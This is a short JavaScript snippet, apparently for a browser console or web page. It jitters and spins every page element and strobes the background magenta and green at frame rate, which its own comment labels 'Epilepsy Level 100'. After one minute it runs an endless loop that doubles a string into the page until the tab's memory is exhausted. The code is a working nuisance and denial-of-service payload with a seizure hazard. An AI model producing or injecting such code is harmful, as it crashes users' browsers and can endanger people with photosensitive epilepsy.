(function ultimateChaos() {
    const intensity = 100;
    const startTime = Date.now();
    
    function chaosLoop() {
        // 1. Violent Shake & Spin (Clamped so elements don't fly off-screen)
        document.querySelectorAll('*').forEach(el => {
            if (el.children.length === 0 || Math.random() > 0.9) {
                let x = (Math.random() - 0.5) * intensity;
                let y = (Math.random() - 0.5) * intensity;
                let rotate = (Math.random() - 0.5) * (intensity * 2);
                el.style.transform = `translate(${x}px, ${y}px) rotate(${rotate}deg)`;
                el.style.transition = 'none'; // Instant jitter
            }
        });

        // 2. Epilepsy Level 100: Rapid Strobe
        document.body.style.backgroundColor = (Math.random() > 0.5) ? '#ff00ff' : '#00ff00';
        
        // 3. The 1-Minute "System Overload" Trigger
        if (Date.now() - startTime > 60000) {
            console.log("%c SYSTEM OVERLOAD INITIATED ", "color: red; font-size: 100px; font-weight: bold;");
            
            // Critical Crash: Infinite recursive string allocation
            let crashData = "VOID";
            while(true) {
                crashData += crashData; // Exponentially doubles until memory death
                let crashEl = document.createElement('div');
                crashEl.innerText = crashData;
                document.body.appendChild(crashEl);
            }
        }

        requestAnimationFrame(chaosLoop);
    }

    chaosLoop();
})();
